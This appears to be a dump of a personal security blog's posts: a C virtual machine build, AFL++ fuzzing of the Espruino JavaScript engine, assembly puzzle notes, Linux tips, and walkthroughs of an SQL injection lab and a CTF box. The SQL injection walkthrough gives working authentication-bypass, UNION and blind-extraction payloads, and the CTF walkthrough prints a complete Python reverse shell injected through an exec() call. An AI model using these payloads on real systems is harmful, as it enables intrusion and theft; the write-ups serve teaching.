I changed the code a little bit, but the idea stays the same.\nThe patched code for the stack:\n1typedef struct stack_node { 2 // Chained list 3 struct stack_node *prev; 4 struct stack_node *next; 5 // Void pointer for values 6 // each stack node will have a pointer towards the target value 7 int *val; 8} stack_node; 9 10typedef struct stack { 11 // Pointers to first and last elements 12 stack_node *first; 13 stack_node *last; 14} stack; My new take on this project was to code everything in the same .h file, to ease using this on other projects. The first version was composed of many .h and .c files, which helped while developping, but needed more work to implement on external projects.\nNow, one shall only #include \u0026quot;vm.h\u0026quot; to get started!\nStep 2: add instructions # I then re-implemented my old code for the instructions and the parser.

end **stack_pointer --\u003e 0x18 *stack_base --\u003e 0x00 *stack_end --\u003e max_size end Feel free to visit the project\u0026rsquo;s repo to check if I finished this implementation, but by now I am for sure struggling with this.\nIn fact with this virtual stack the VM is now able to push \u0026amp; pop and all that stuff, here is how I implemented them:\n1void my_push(Registers *regs, Stack *stack, int shellcode) { 2 // get the value to push 3 int value = shellcode \u0026amp; 0x00ffffff; 4 // get a pointer to the value 5 int *pointer = \u0026amp;value; 6 // make the stack pointer pointing to the pointer 🧠 👉 👈 7 *stack-\u0026gt;stack_pointer = pointer; 8 // increment the cursor for the top of the stack 9 stack_inc(stack); 10} The same goes for the pop, except that we first decrement the stack pointer index, as we incremented it last, and then we store the value pointed into the corresponding register.\nI then stumbled upon other bugs in my code, which discouraged me to continue further.\nSecond attempt # Maybe one year later or so I deceided to continue this project.\nI settled for a more kernel-like approach: using chained list instead of mallocing a big chunk of memory.\nHere is my go:\nflowchart LR subgraph list direction LR a[*first] --\u003e a1[0xff5500aa] b[*last] --\u003e b1[0xff5500bb] subgraph \"node @0xff5500aa\" direction LR A1[*prev] --\u003e D1[NULL] B1[data] --\u003e 0 C1[*next] --\u003e E1[0xff5500bb] end subgraph \"node @0xff5500bb\" direction LR A2[*prev] --\u003e E2[0xff5500aa] B2[data] --\u003e 1 C2[*next] --\u003e D2[NULL] end end Which might be simpler to code, and to understand.\nHere are the associated structs:\n1struct node { 2 struct node *prev; 3 struct node *next; 4 int data; 5} typedef node; 6 7struct list { 8 struct node *first; 9 struct node *last; 10} typedef list; Very basic, therefore effective.\nThe idea afterwards is to create the list pointer, which will be our LIFO stack. All the new nodes will be allocated in the heap for us \u0026ndash; the real heap, not our VM\u0026rsquo;s.\nCode # As a PoC for this new stack concept, here is how I did it, plus some performance indicators:\nmain.h # 1#include \u0026lt;stdio.h\u0026gt;

So I will go with this tool for this grand prix in order to familiarize myself with it.\nChosing target # If you want to follow my journey in the real events timeline, click here.\nLooking by curiosity what are all the known JavaScript engines (and there are a lot of them), one caught my attention: Espruino.\nI thought this project was in the spirit of the minimalism, and thus wanted to see if it was enough to avoid crashes.\nEspecialy design for embeeded devices and IoT, still maintained after more than 7 years, this project was a good practice for fuzzing.\nInstrumentation # For this fuzzing project, I used the AFL++ Docker container, mapping the code of the target in /src.\nThe first step for fuzzing, we have to prepare the target binary. ALF uses a custom GCC in order to optimize results and explore the binary. We have to build the binary from source and patch the Makefile.\n1--- a/Makefile 2+++ b/Makefile 3@@ -1,8 +1,12 @@ 4- CC = gcc 5+ CC = afl-gcc In more complex project, you will have to also change the compiler to alf-clang-fast++, add some compilation flags for optimizations, and even have to patch the main() {} function for AFL.\nOn compilation you should see some warnings/infos from AFL:\nI will copy the built binary in /usr/local/bin/, and create a new directory for this fuzzing:\n1cd $HOME 2mkdir in # our inputs for the fuzzer 3mkdir out # outputs of the fuzzer (crashes, test queue...) Minimizing test cases # The next step is to get good test cases to speed up the process of fuzzing. The fuzzer will base its mutations on those test cases, so the more unique tests you have, the better.\nBy chance, most projects have good tests in their /tests/ directory, so let\u0026rsquo;s copy them to our inputs:\n1cp /src/tests/*.js in/ Once again, for optimizations, it is a good practice to minimize the test cases, it can save a lot of time during fuzz.\n1mkdir min # our minimized inputs 2afl-cmin -i in -o min -- $TARGET @@ # minify the tests for the target 3# the \u0026#39;@@\u0026#39; stands for the input file 4# ie. for the target /bin/cat, we would use: 5# afl-cmin -i in -o min -- /bin/cat @@ After running the command (this will take a while if you have hundreds of cases) we now have a lot more efficient test cases in our min dir.\nFuzzing # Now that we have our test cases ready, let\u0026rsquo;s get to fuzing!\nAs simple as that:\n1afl-fuzz -i min -o out -- $TARGET @@ We can also add the -D options for mutating random bytes in the payload, and it is recommanded for better results, despite of increasing by a lot the time of fuzzing.\nYou can multithread AFL:\n1# create a master process 2afl-fuzz -M name1 -- $TARGET @@ 3# create a slave 4afl-fuzz -S name2 -- $TARGET @@ The processes will communicate together and trade their payloads.\nGetting a crash # Within a few minutes I got a crash on the binary with fuzzing, and I got hundreds the first day, pretty nice.\nThe first crashes were \u0026ldquo;only\u0026rdquo; some SEGFAULT, and the files were also already a bit tiny: 79 bytes for a crash.\nSo my first crash was due to the following file (base64):\nZnVuY3Rpb64gZigpIHsKfQoKYSA9IFsKICB2b2lkIDAsCiAgdm9pZCBmLAogIHZvaWQgZigpCl07 CgpyZXN1bHQgPSBhID09ICIsLCI7Cg== Which gives:\n1functio f() { 2} 3 4a = [ 5 void 0, 6 void f, 7 void f() 8]; 9 10result = a == \u0026#34;,,\u0026#34;; This code crashes Espruino with no error message, only a SEGFAULT. My guess here was that the parsing code had an issue with the functio f() {} part, and crashes the program, maybe a lexer issue due to invalid token?\nAfter some time I managed to minimize the payload down to 4 bytes: da5sCg== or in hex 75ae 6c0a. So I have here a 4-bytes SEGFAULT.\nI also got one buffer overflow of 1.5kB but I never managed to reproduce it on any other system, I concluded that this was a glitch in the matrix and cried a lot, because usualy you only get SEGFAULT or SIG_ABORT crashes, a BoF would have been the cherry on top.\nBut I got a lot of crashes tho:\n(Don\u0026rsquo;t mind the low amount of exec/s here, the first day I got ~100 exec/s but with time it decreased due to the size of the payloads in the corpus)\nBonus points # With only 4 bytes there was only a few bytes of improvement possible, so I decided to dig into the bug. Too bad that this caused only a SEGFAULT.\nAfter some time of code analysis, coding, guessing and compiling, I managed to patch the bug in an ugly way, but made a pull request anyways, which was not merged, but instead the developpers made an other patch in order to fix this. So I guess this counts?\nLink of the final patch.\nStruggles (or real history) # In this section you will read the truth about my fuzzing journey, how much time it took, my mistakes and so on\u0026hellip;\nAct I: shock # The day I started to run for this competition, radareorg released a new version of their radare2 tool. Imagine getting a crash on the latest version of one of your favorite tools 😍\nI started to fuzz like I explained in this post, but after days of fuzzing, all I had was a corpus of 2000 files and 6 hangs, which does not count as crash.\nThe bad part was also that I only had like 8-12 exec/s, which is very slow. And I had no clues about why and how.\nAct II: denial # It was not my fault, right?\nSo I decided to switch of target. I went for Python 3.8. After building it, making test cases and min them, a day passed, and I started to fuzz for the night. Nothing after hours, not even a new find. There was a problem somewhere. It must be Python, I was thinking. Of course it was Python the problem, not me.\nI switched of target many times, here is what I tried (you can try yourself to fuzz them if you want):\n1ls $HOME/fuzz 2SimpleNES nvim radare2 PcapPlusPlus 3dlib inih polybar sql-parser 4SameBoy feh nasm python 5vim Act III: anger # After trying dozens of projects to fuzz, I started to be a bit angry, or more precisely frustrated. I was trying to fuzz a binary to get a crash, but I got nothing for the past week. Angry at myself that I couldn\u0026rsquo;t setup a simple fuzzing lab.\nAct IV: bargaining # In order to save myself of myself, I started to try a lot of things, with my newly gained experience in fuzzing, I decided to go back to my original idea: radare2.\nWith that, I also read the manual and all the options for AFL++ in order to get better results, I even asked online for help, of course SoEaSy DMed me to help. He wasted some time with me, and we supposed that the low amount of exec/s was due to the fact that I start r2 in interactive mode, and the process limit itself to a certain amount of threads, so the time the process kill itself in order to spawn a new one, it limits a lot the number of execs.\nHe also asked me to try other binaries of the radare2 suite, even to write a harness for a specific function to fuzz.\nAct V: depression # Even with those tweaks and tries, there were no improvements in my results after 5 days of fuzzing. 😢\nI decided to take a break for days.\nAct VI: testing # After my break I wanted to know why I did not have any results with my fuzzing. And for me the obvious reason was an issue of the famous 8th layer of the OSI model: the keyboard-chair interface.\nFor my previous choices, either it was a bad target, or I did things wrong.\nAct VII: acceptance # The only way forward for me was to find an other target, and see if I get a crash easily.\nNow that you have the past history of the project, see the real fuzzing journey.\nConclusion # I made 11th out of 33 and I am very happy about that\nHere you will find the final results including all the submitted entries for this year!\n","date":"18 July 2022","permalink":"/posts/bggp3/","section":"Posts","summary":"So this summer - and it has been this for the past 2 years - the famous Binary Golfing Grand Prix took place online for it\u0026rsquo;s 3rd edition, and of course I decided to give it a try.","title":"🏌️ BGGP3 - How to crash a famous JS engine for fun"},{"content":" Forewords # So recently a coworker of mine showed a book about assembly poems, at first I was like \u0026ldquo;well this joke is very funny\u0026rdquo; and then I read the first page. 5 minutes later I ordered the same book for my own, and now that it has been received, I want to write my notes here.\nThere is an online and free version of the book.\nI will try to understand each 64 pages of this awesome work, in order to maintain my assembly knowledge and to learn new tricks.\nOf course I can be wrong in my interpretations of certain code or instructions, if so, feel free to help me improve!\n0x00 # 1xor eax,eax 2lea rbx,[0] 3loop $ 4mov rdx,0 5and esi,0 6sub edi,edi 7push 0 8pop rbp The first page is pretty straightforward. As you can see every line sets one register to 0.\nEvery instruction here is very common and easy to understand, but one thing caught my attention: loop $. So let\u0026rsquo;s dig a bit here.\nloop \u0026lt;label\u0026gt; can be resumed like so:\n1loop: 2 ; if cx == 0 jmp to end 3 test cx, cx 4 jnz $+3 5 6 dec cx 7 jmp loop As you can see, it decrements cx at each iteration until it is 0. So a loop $ would simply set cx to 0, as the label to loop through is $, the symbol for the actual address.\nNormally with loop label you would have some code between label and the loop instruction, but here there is none, so the loop only decrements cx.\nPretty sneaky trick.\n0x01 # 1.loop: 2 xadd rax,rdx 3 loop .loop This one is a little trick and pretty obfuscated but was very quick to understand. In fact, this loop produces the fibonacci sequence for the first cx elements.\nAs we learnt about loop at 0x00, it loops until cx equals 0, and here there is one instruction which gets exectued within the loop.\nxadd is quite uncommon, this instruction can be coded as:\n1xadd: 2 ; swap rax and rdx 3 xchg rax, rdx 4 5 ; rdx = rdx + rax 6 mov r8, rdx 7 add r8, rax 8 mov rdx, r8 One experienced programmer can spot the algorithm to compute the fibonacci sequence here, which calculate the sum of the two previous elements of the sequence.\n0x02 # 1neg rax 2sbb rax,rax 3neg rax This code was a bit tricky, after discussing with friends (xThaz \u0026amp; SoEaSy) we agreed to say that this code tells if rax is different than 0.\nAt first I said that it tells the sign of rax, but I missunderstood the sbb instruction, but I was wrong and overlooked the computing of the sbb rax, rax.\nThis code requires to look at neg at first, despite of switching the sign of the target, it also sets the carry flag CF accordingly with the sign.\nWe can now dig sbb, its code can be:\n1sbb: 2 ; rax is argv[0] 3 ; rbx is argv[1] 4 mov r8, rax 5 add r8, CF 6 sub rbx, r8 By looking at the possible output values, we van see that it is a substraction by either rax + 0 or rax + 1 of rbx. Given that in this code, we have sbb rax, rax, we can sse that we will only get rax = rax - (rax + CF), with CF at 0 or 1, thus the output of the instruction is either 0 or 1, corresponding to the initial sign of rax.\n0x03 # 1sub rdx,rax 2sbb rcx,rcx 3and rcx,rdx 4add rax,rcx With the previous experiences we now know about all the above instructions, we can deduce the behaviour of the code, which can be coded in a more high-level language like Python:\n1def my_func(rax, rdx): 2 if rax \u0026gt; rdx: 3 rax += rdx Yes, this is that simple. The tricky part comes from the sbb and and part.\nsub rdx, rax stores the difference in rdx, and sets the CF if needed. sbb rcx, rcx sets rcx to neg CF (either 0 or 0xffffffff) and rcx, rdx If rax was lower than rdx at line 1: rcx would be 0 and then the and sill still set rcx to 0 If rax was greater than rdx at line 1: rcx would be 0xffffffff and so, rcx becomes the value of rdx add rax, rcx is trivial now So 0x03 adds rdx to rax if rax \u0026gt; rdx.\n0x04 # 1xor al,0x20 This code was pretty simple to test, I was unsure of the exact behaviour of it, so I tested it:\n1for x in range(255): 2 print(chr(x), chr(x ^ 0x20)) And as you can see by executing this code, the printable characters have their case swapped: lowercase letters become upperccase, and vice-versa.\n0x05 # 1sub rax,5 2cmp rax,4 This code is so tiny that it seems complex, but fear not, I think I have the solution for it. This code shows the similarities and difference beteween sub and cmp.\nsub rax, 5 actually overwrites the value of rax cmp rax, 4 computes sub rax, 4 and only stores the result in the flags, rax is not modified 0x06 # 1not rax 2inc rax 3neg rax This code teaches the trick for those instructions:\nnot rax does the two\u0026rsquo;s-complement for the value -\u0026gt; not 0x5 = 0xfffa inc rax; neg rax does the same -\u0026gt; neg 0x6 = 0xfffa 0x07 # 1inc rax 2neg rax 3inc rax 4neg rax This code shows us that the inc; neg is symetric: doing it twice leads us to the original value. Which is pretty logic as inc; neg is the same as neg.\n0x08 # 1add rax,rdx 2rcr rax,1 rcr is not quite common, it rotates the bits to the right.\nIn fact, there is stuff hapenning with the CF but I will skip this part as it is too long.\n0x09 # 1shr rax,3 2adc rax,0 shr is a right shift of bits, with storing into CF for overflowing last bit. This does the same as dividing by 2^n, with shr rax, n.\nadc is add with the CF in addition:\n1; rax is argv[1] 2; rbx is argv[2] 3adc: 4 add rax, rbx 5 add rax, CF So here the code divides rax by 8 (2^3) and if the 3rd bit was 1, it increases rax, we can rewrite this code in Python to make things clearer:\n1def nine(a): 2 cf = a \u0026amp; 0b100 3 result = a / 3 4 result += cf 5 return result 0x0a # 1 add byte [rdi],1 2.loop: 3 inc rdi 4 adc byte [rdi],0 5 loop .loop Now it gets a bit interesting.\nadd byte [rdi], 1 increases the value of what is pointed by the address at rdi.\ninc rdi adds 1 to rdi without modifing the CF.\nadc byte [rdi], 0 writes the content of CF at the address pointed by rdi.\nloop .loop -\u0026gt; dec cx; jmp short .loop.\nMy guess here is that it sets every bytes in memory (at the address pointed by rdi) to the content of CF. The size of the memory is rcx, and the first byte is set to 1 in order to identify the chunck (like a start bit in telecommunications).\n0x0b # 1not rdx 2neg rax 3sbb rdx,-1 Here I got stuck for at least one hour, and because we had already seen all instructions, I did not bothered re-reading the documentation. It is pointless to read something twice, right?\nSo after calling the joker \u0026ldquo;coworker help\u0026rdquo;, we saw that neg does not only the 2-complement of the register, but also sets CF to 1 if the register is not 0. Remember to always double check what you read, especially documentation.\nSo this code invert all bits of rdx, and if rax is not 0, it will decrement rdx by 1.\n0x0c # 1mov rcx,rax 2xor rcx,rbx 3ror rcx,0xd 4 5ror rax,0xd 6ror rbx,0xd 7xor rax,rbx 8 9cmp rax,rcx Despite the number of lines, this code was very easy to understand, in fact I was even able to guess (CTF player strenght here) the behaviour of it within a few seconds.\nThe code acts in two steps, and demonstrates that a ror + xor is the same as a xor + ror.\nThe first 3 lines copies rax into rcx and xor rcx, rbx, and then does a ror rcx, 0xd. The other next 3 lines does the opposite: ror rax, 0xd (and also ror rbx, 0xd) and xor rax, rbx.\nFinally we see that both rax and rcx have the same value. Proving that ror;xor is commutative.\n0x0d # 1mov rdx,rbx 2 3xor rbx,rcx 4and rbx,rax 5 6and rdx,rax 7and rax,rcx 8xor rax,rdx 9 10cmp rax,rbx This does the same as 0x0c but for xor; and \u0026amp; and; xor.

These must be readable and writeable from anywhere in my program, I needed to make either a forbidden global variable, or create a local one which will be passed to the used functions. I went with the second solution, as it is less dirty, and I wanted to try my best by using pointers and C stuff.\nI created a struct for my registers:\n1typedef struct Registers { 2 // common operations registers 3 int a, b, c, d; 4 5 // array to work with when manipulating registers\u0026#39; indexes 6 // each element will point to the address of the correspponding register 7 // see `setup_registers()` for more details 8 int *registers[4]; 9 10 // flags are stored in one integer, using masks to extract them 11 // remainder, zero (cmp) 12 int flags; 13} Registers; I started to work with only 4 registers a, b, c, d and one for the flags after instruction\u0026rsquo;s execution.\nI also needed a way to (re)set the said registers to whatever I wanted, so I created this reset function:\n1/* Set all registers in the array in order to easyliy manupulate them 2 * like: regs-\u0026gt;registers[2] = 0x2a; 3 * is the same as: regs-\u0026gt;c = 0x2a; 4 */ 5void setup_registers(Registers *regs) { 6 // each element of the array points to the corresponding register\u0026#39;s address 7 regs-\u0026gt;registers[0] = \u0026amp;regs-\u0026gt;a; 8 regs-\u0026gt;registers[1] = \u0026amp;regs-\u0026gt;b; 9 regs-\u0026gt;registers[2] = \u0026amp;regs-\u0026gt;c; 10 regs-\u0026gt;registers[3] = \u0026amp;regs-\u0026gt;d; 11} 12 13/* Just print the values 14 */ 15void print_registers(Registers *regs) { 16 printf(\u0026#34;=== Registers: ===\\n\u0026#34;); 17 printf(\u0026#34;a: 0x%x\\n\u0026#34;, regs-\u0026gt;a); 18 printf(\u0026#34;b: 0x%x\\n\u0026#34;, regs-\u0026gt;b); 19 printf(\u0026#34;c: 0x%x\\n\u0026#34;, regs-\u0026gt;c); 20 printf(\u0026#34;d: 0x%x\\n\u0026#34;, regs-\u0026gt;d); 21 printf(\u0026#34;flags: 0x%x\\n\u0026#34;, regs-\u0026gt;flags); 22} 23 24/* Force the values of the registers to 0 25 */ 26void reset_registers(Registers *regs) { 27 regs-\u0026gt;a = 0; 28 regs-\u0026gt;b = 0; 29 regs-\u0026gt;c = 0; 30 regs-\u0026gt;d = 0; 31 regs-\u0026gt;flags = 0; 32} Emulation # Emulating an instruction is very basic:\nParse the input Detect the corresponding instruction Execute the instruction But I wanted to do something a bit fancy here: instead of just make a big 0xswitch statement, I created a map, or more precisely an array of pointers of functions. Meaning that each entry of the array is a pointer, pointing to the corresponding function to call:\n1void emulate(Registers *regs, int shellcode) { 2 // parsing the input to extract only the opcode 3 int opcode = (shellcode \u0026amp; 0xff000000) \u0026gt;\u0026gt; 0x18; 4 5 // instructions is an array of pointers of function 6 // each index points to the according function corresponding to the opcode 7 // it is very easy to change the opcode for a certain function 8 void (*instructions[10])(Registers *, int); 9 // no opcode 0 defined for the moment 10 instructions[1] = my_mov; 11 instructions[2] = my_push; 12 instructions[3] = my_add; 13 instructions[4] = my_sub; 14 instructions[5] = my_jmp; 15 instructions[6] = my_cmp; 16 instructions[7] = my_call; 17 instructions[8] = my_exit; 18 instructions[9] = my_pop; 19 20 // code ommited for future spoilers 21 redacted(); 22} Why this \u0026ldquo;crazy\u0026rdquo; stuff instead of the good old switch? You may ask. Well, for the sake of simplicity, yes, s i m p l i c i t y, I used this strategy for a good reason:\n1// calling the corresponding function only takes 1 line of code, 2// and no processing at all: no if, nor loop 3(*instructions[opcode])(regs, shellcode); Then each function, such as my_mov and so, do the wanted behaviour of the corresponding instruction, for example:\n1/* Moves the value into the register 2 * value is either a register or a plain hex integer 3 */ 4void my_mov(Registers *regs, int shellcode) { 5 int is_reg1 = (shellcode \u0026amp; 0x00f00000) \u0026gt;\u0026gt; 0x14; 6 if (is_reg1 == 0x1) { 7 // get index of target reg 8 int target_reg = (shellcode \u0026amp; 0x000f0000) \u0026gt;\u0026gt; 0x10; 9 // get value to mov 10 int is_reg2 = (shellcode \u0026amp; 0x0000f000) \u0026gt;\u0026gt; 0xc; 11 // get moved value 12 int value = (shellcode \u0026amp; 0x00000fff); 13 // if source is a register and not a value 14 if (is_reg2 == 0x1) { 15 int source_reg = value \u0026gt;\u0026gt; 0x8; 16 value = *regs-\u0026gt;registers[source_reg]; 17 } 18 19 // finally, move the value into the register 20 *regs-\u0026gt;registers[target_reg] = value; 21 22 } else { 23 except(\u0026#34;Invalid value for mov (arg a is not a register)\u0026#34;); 24 } 25} Which leads to my next subject: parsing.\nParsing # Yes, I did not mentionned how my instructions are encoded and how to parse them. See the following scheme to understand my way of crafting one instruction:\nopcode isReg1 value1 isReg2 value2 01 1 0 0 045 This instruction (0x1100045) is a mov a, 0x45. Yes this is a bit silly but here is an another scheme in order to better explain my way of encoding my instructions:\ngraph LR; A[opcode] --\u003e B[isReg1] B --\u003e|==1| C[value1, index of register] B --\u003e|==0| D[value1, plain hex] C --\u003e E[isReg2] D --\u003e E E --\u003e|==1| F[value2, index of register] E --\u003e|==0| G[value2, plain hex, left 0-padded] And here is the size of each portion of the instruction:\nopcode: word isReg1: byte value1: byte if isReg1 == 1, any size else (depends on the instruction) isReg2: byte value2: byte if isReg2 == 1, any size else (depends on the instruction) I made the choice to use a constant-sized instruction set, to help me parsing each one, instead of having to hardcode every variant that a variable-length instruction set would require.\nOnce this logic has been declared, there was one thing left to do: actually parsing the instructions. In fact, as you may have noticed in my instruction functions (my_mov() my_add()...), I used binary masking and shifting like so: (a \u0026amp;\u0026amp; 0xff) \u0026gt;\u0026gt; 0x10.\nDemo time # I used the following code:\n1int main(void) { 2 // init the struct 3 Registers regs; 4 // setup the registers\u0026#39; array 5 setup_registers(\u0026amp;regs); 6 7 // set everything to 0 8 reset_registers(\u0026amp;regs); 9 print_registers(\u0026amp;regs); 10 11 // mov a, 0x45 12 emulate(\u0026amp;regs, 0x1100045); 13 print_registers(\u0026amp;regs); 14 15 // mov c, 0x2 16 emulate(\u0026amp;regs, 0x1120002); 17 print_registers(\u0026amp;regs); 18 19 // exit(a) 20 emulate(\u0026amp;regs, 0x8000000); 21 22 // yes, pointless return but it is for the personnal ethics 23 return 0; 24} Special thanks to:\nMasterfox: for helping me debugging my issues with pointers and structs Nofix: for helping me debugging my array of pointers of functions stuff ","date":"9 May 2022","permalink":"/posts/c-vm/","section":"Posts","summary":"The second part of my series on low-level learning journey, let\u0026rsquo;s build the VM in C this time!","title":"🔎 Creating a VM for fun - Part 2: C"},{"content":"","date":"15 April 2022","permalink":"/tags/binary/","section":"Tags","summary":"","title":"binary"},{"content":"","date":"15 April 2022","permalink":"/tags/elf/","section":"Tags","summary":"","title":"elf"},{"content":" So tmp.out - once again - got me.

You forgot to install an important package but already completed all the steps? Do not reinstall from scratch! Just boot on your USB, mount your system back and chroot into it! If using Nvidia card, set nomodeset on boot if screen tearing/glitch Make sure to have some space for the root partition, even 32GB is tight sometimes Update your pacman\u0026rsquo;s keyring if the ISO is old with pacman-key --populate archlinux Make sure to install dhclient and a network manager to access the Internet Disable the computer speaker BEEP: echo blacklist pcspkr \u0026gt; /etc/modprobe.d/nobeep.conf If you find something broken here, feel free to send an issue on the Github repo.\nAs I am in some distro reinstallation process, I will update this notes on the fly.\n","date":"18 August 2021","permalink":"/posts/install-archlinux/","section":"Posts","summary":"I recently installed once again Archlinux on a laptop.

I realized that Docker volumes where still there, and I decided to remove them.\n1sudo docker volume prune Leading me with a total of 40G freed in minutes!\nSort disk usage # While troubleshouting my disk usage, I used this command to sort by usage:\n1sudo du / -x -d 1 | sort -n You can then investigate which directory is taking most usage on your disk.\n","date":"25 March 2021","permalink":"/posts/free-space-on-disk/","section":"Posts","summary":"Recently I wanted to run a MySQL Docker container and encountered a tragical error:","title":"Free space on disk for Linux distros"},{"content":"","date":"25 March 2021","permalink":"/tags/linux/","section":"Tags","summary":"","title":"linux"},{"content":"","date":"25 March 2021","permalink":"/tags/partition/","section":"Tags","summary":"","title":"partition"},{"content":" Cool box, maybe too easy for a medium?

And I will go through all levels in this blog post, explainning the expected way to solve each of them.\nThe lab currently contains 5 levels, and I will update this post as I add more of them 👍\nInstallation # The GitHub repository is at https://github.com/OxNinja/SQLi-lab if you want more information.\nFirst I clone the lab in a folder, add its IP to my hosts file for conveignance, and then build it with the given script:\n1git clone https://github.com/OxNinja/SQLi-lab.git 2cd SQLi-lab 3echo \u0026#39;172.16.0.2 sqli.lab\u0026#39; \u0026gt;\u0026gt; /etc/hosts 4./build.sh Let\u0026rsquo;s wait for about 5-10 seconds for the MySQL container to boot, and then visit http://172.16.0.2, or http://sqli.lab, you should get this:\nWe can now start level 1!\nLevel 1 # By reading the level\u0026rsquo;s introduction, we know that the admin uses a database with its passwords. We want to get them all, without having to guess the website. But first we need to know how the server works.\nBy inputing a random website we get:\nThe output is not that verbose, but we might be able to guess the SQL query made:\n1SELECT password FROM my_table WHERE website=\u0026#39;$website\u0026#39; So let\u0026rsquo;s try a basic injection, like ' or 1=1-- -:\nOkay we got him, we have the URL for the next level.\nLevel 2 # Here we need to retrieve the admin\u0026rsquo;s password. Let\u0026rsquo;s try admin:admin:\nOf course we don\u0026rsquo;t have anything. With the information we have, we can imagine the SQL query:\n1SELECT username, mail, password FROM users WHERE username=\u0026#39;$username\u0026#39; AND password=\u0026#39;$password\u0026#39; We can try again with a basic injection ' or 1=1;-- -:\nIt works fine 😊\nWe could also have injected the payload in the password field:\nLevel 3 # An online shop! We must find what is hidding in there. But first, let\u0026rsquo;s use this product search input:\nNothing really interesting 😐\nBut we see a message on the page: \u0026lsquo;Login is disabled for the moment.\u0026rsquo; what is this? Maybe we could see something in the source code?\nBingo! We have an SQL query, but how can we use it? The only solution here is to make an UNION-based SQL injection. Let\u0026rsquo;s try it out:\n1UNION SELECT * FROM level3_users Should do the trick. Our payload: ' UNION SELECT * FROM leve3_users;-- -\nYes it works! We continue to the fourth level.\nLevel 4 # This level might be harder than the previous ones for some attackers. And it is normal 😈\nThe page shows us some buttons we can click to get an article\u0026rsquo;s content:\nNote the ?id= parameter in the URL this could help us in the future.\nLet\u0026rsquo;s see the generated source code:\nHow interesting, the server adds a comment containing the article\u0026rsquo;s id right before its content.\nHere we don\u0026rsquo;t have that much information. Our only escape could be \u0026ndash; again \u0026ndash; an UNION-based SQLi. Let\u0026rsquo;s try one:\nWe don\u0026rsquo;t get anything from it, even if we provided an article\u0026rsquo;s id 😕\nThe right thing to ask is: why? Why do we get nothing with our payload? Why is the article 3 not even rendered?\nIn an UNION query, both SELECT statements must return the same number of columns! So maybe we are wrong, maybe there is not two columns in the server\u0026rsquo;s query. We can figure out the server\u0026rsquo;s query:\n1SELECT * FROM articles WHERE id=\u0026#39;$id\u0026#39; But how many columns are in there? We can count what we see on the page: the title and the content of the article\u0026hellip; AND the id! Those are three columns. Let\u0026rsquo;s try with three columns:\nWe now have a second article rendered on the page! We can try to customize our payload to select strings or values:\nNice it works as we want! We now want to know the database\u0026rsquo;s name:\nOK, now we want to know the tables of the database:\nNote the limit 1,1 at the end, we need it in order to retrieve one by one. Otherwise the UNION query will get an error because we want to SELECT more elements than the first statement.\nHere we get the table COLLATIONS, which is part of the MySQL\u0026rsquo;s server by default. We only want the tables from our database database:\nOK now we want to get the columns of this table:\nContinuing like this we get the database\u0026rsquo;s schema:\n1CREATE DATABASE database; 2 3CREATE TABLE level4_articles (id int, title text, content text); 4CREATE TABLE level4_users (username text, password text); Level 5 # We want to find the admin\u0026rsquo;s password. Let\u0026rsquo;s try the basic admin:admin:\nOf course we got a \u0026ldquo;Wrong username/password\u0026rdquo; message. Maybe we can try a basic SQLi?\nNice, the server think we are admin! But the goal here is to find the password, not to log as him.\nWe now know that this form is vulnerable to SQL injections, and when we are logged as the admin we have a \u0026ldquo;Welcome admin\u0026rdquo; message. Maybe we can try a blind injection like so:\nBetter! we transformed the query:\n1# From: 2SELECT * FROM users WHERE username=\u0026#39;$username\u0026#39; AND password=\u0026#39;$password\u0026#39; 3# To: 4SELECT * FROM users WHERE username=\u0026#39;admin\u0026#39; AND password=\u0026#39;\u0026#39; OR password LIKE \u0026#39;%\u0026#39;;-- -\u0026#39; Which can lead us to the admin\u0026rsquo;s password! Let\u0026rsquo;s continue like so:\nWe now know that the first character of the password is not \u0026ldquo;a\u0026rdquo;. Great! Moving on by changing the letter each time we get the first letter: \u0026ldquo;f\u0026rdquo;\nWe now have a method to find the whole password, so I will skip to the end untill the final check:\nAfter this point, no matter what the next character is, we get the \u0026ldquo;Wrong username/password\u0026rdquo; message. This means that we reached the end of the password, let\u0026rsquo;s check it out:\nGreat! We know the admin\u0026rsquo;s password now. To continue we have to get to the page /f05c8652de134d5c50729fa1b31d355b.php.\nOn this page we are redirected to /win.php, meanning we got to the end of the lab.\nWe just finished the last level of this lab!

So your code is 100% secure.\nBy reading the content of their homepage, we get a good hint : they are hosting the source code on the server. We have to find SuperSecureServer.py ont it !\nFinding source code # The easiest way I found on the moment was to fire up Burpsuite and use a directory wordlist.\nBy making a first request to the webserver, I sent it to Burp\u0026rsquo;s intruder in sniper mode. Using a simple directory wordlist (common.txt) I placed the payload\u0026rsquo;s position as GET /§a§/SuperSecureServer.py, launched the attack and waited for burp to get a 200 response code.\nThe source code is at /develop/SuperSecureServer.py !\nSource code auditing # By reading the code, I found that during the document serving process, the exec() function is called.\n1def serveDoc(self, path, docRoot): 2 path = urllib.parse.unquote(path) 3 try: 4 info = \u0026#34;output = \u0026#39;Document: {}\u0026#39;\u0026#34; # Keep the output for later debug 5 exec(info.format(path)) # This is how you do string formatting, right? \u0026lt;-- here 6 cwd = os.path.dirname(os.path.realpath(__file__)) 7 docRoot = os.path.join(cwd, docRoot) 8 if path == \u0026#34;/\u0026#34;: 9 path = \u0026#34;/index.html\u0026#34; Reverse shell # After understanding when the exec was called, I injected a python reverse shell payload. Basically this is a command injection through format string, string which got evaluated right after. The payload we could manipulate was directly the path we GET on the server. My final payload for the reverse shell was :\nGET /\u0026#39;;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; This payload works because :\nThe first ' is used to break the string generated by the format string Both ; to inject a new python code between The last ' is to make an empty string with the single quote from the source code, otherwise an error is raised So I just launched a netcat connexion listenning on my machine, and made a request on the server with the payload to get the shell.\nUser # The reverse shell we have is as www-data, we need to privesc as a regular user.\n1\u0026gt; ls /home 2robert We know that user robert must be the user we need to privesc as.

